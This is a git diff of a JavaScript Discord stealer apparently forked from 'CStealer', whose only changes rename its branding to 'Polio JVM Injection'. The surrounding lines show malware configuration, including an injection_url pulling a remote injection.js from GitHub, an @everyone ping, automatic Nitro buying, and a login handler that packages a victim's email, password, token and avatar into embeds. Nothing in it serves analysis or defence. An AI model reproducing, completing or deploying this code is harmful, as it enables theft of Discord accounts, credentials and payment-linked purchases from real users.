@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'CStealer Injection', 
+  embed_name: 'Polio JVM Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/Foxparadox1337/Chnk/main/injection.js', 
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
+            text: 'Polio Injection methods 2024 non leaked??!!',
             icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
